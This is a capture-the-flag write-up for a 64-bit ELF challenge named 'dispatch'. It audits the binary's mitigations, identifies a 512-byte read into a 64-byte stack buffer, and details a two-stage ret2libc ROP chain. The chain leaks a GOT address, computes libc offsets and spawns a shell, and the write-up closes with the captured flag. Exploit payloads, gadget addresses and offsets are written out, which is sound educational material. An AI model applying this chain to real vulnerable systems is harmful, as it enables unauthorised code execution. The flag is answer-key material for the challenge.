---
challenge: dispatch
category: pwn
techniques: [stack-buffer-overflow, ret2libc, puts-got-leak, rop, glibc-2.39]
time_to_flag: 4
status: solved
---

# Sparrow Freight Dispatch — Pwn Exploitation Writeup

## 1. Challenge Overview
- **Binary:** `dispatch` (64-bit ELF, x86-64, dynamically linked)
- **Target OS:** Ubuntu 24.04 LTS with `glibc 2.39` (`2.39-0ubuntu8.9`)
- **Remote Host:** `nc pwn.h7tex.com 42423`
- **Provided Files:**
  - `dispatch`: Challenge binary
  - `libc.so.6`: Target system C library
  - `ld-linux-x86-64.so.2`: Matching dynamic linker
  - `README.txt`: Execution guidelines

## 2. Binary Mitigation Audit (checksec)
- **Arch:** x86-64 Little Endian (`ET_EXEC`)
- **RELRO:** Partial RELRO (GOT writable, `.got.plt` at `0x403fe8`)
- **Stack Canary:** Disabled (`__stack_chk_fail` not present)
- **NX (No-Execute):** Enabled (PT_GNU_STACK has no executable permissions)
- **PIE:** Disabled (fixed virtual address base `0x400000`, entry `0x401090`)

## 3. Vulnerability Analysis
- The program flow is simple:
  - `main` sets up unbuffered stdout via `setvbuf(stdout, NULL, _IONBF, 0)`, prints a banner, and calls `vuln()`.
  - In `vuln()`:
    ```c
    void vuln() {
        char buf[64];
        puts("dispatch> enter waybill number: ");
        read(0, buf, 0x200); // 512 bytes read into a 64-byte stack buffer!
        puts("waybill logged.");
    }
    ```
- **Overflow Offset Calculation:**
  - Buffer allocation: `sub rsp, 0x40` (64 bytes).
  - Saved RBP: 8 bytes.
  - Return address offset: $64 + 8 = 72$ bytes.
  - Read length: 512 bytes $\implies 448$ bytes of overflow on the stack.

## 4. Exploitation Strategy (Two-Stage ret2libc)
Since there is no built-in `win()` function ("No spare key was left out this time"), we execute a two-stage `ret2libc` ROP chain using gadgets present in the binary.

### Gadgets & Addresses
- `pop_rdi_ret`: `0x401176` (explicitly left as a symbol in `.symtab`)
- `ret` (stack alignment): `0x401177`
- `puts@plt`: `0x401060`
- `puts@got`: `0x404000`
- `main`: `0x4011bb`

### Libc Offsets (`libc.so.6` glibc 2.39)
- `puts`: `0x87cc0`
- `system`: `0x58750`
- `"/bin/sh"`: `0x1cc42f`

### Exploit Execution Flow
1. **Stage 1 (Information Leak):**
   - Payload 1: `b"A" * 72 + p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(MAIN)`
   - Leaks the 64-bit runtime address of `puts@got`.
   - Computes `libc_base = puts_leak - 0x87cc0`.
   - Computes `system = libc_base + 0x58750` and `binsh = libc_base + 0x1cc42f`.
   - Returns to `main()` cleanly, re-invoking `vuln()`.
2. **Stage 2 (Spawning Shell):**
   - Payload 2: `b"B" * 72 + p64(RET) + p64(POP_RDI) + p64(binsh) + p64(system)`
   - The extra `ret` gadget aligns the stack to 16 bytes before calling `system()`.
   - Once the shell spawns, execute `cat flag*`.

## 5. Retrieved Flag
```text
H7CTF{9138f3e7-f1a5-4b03-8e2f-862ab9d576e2}
```
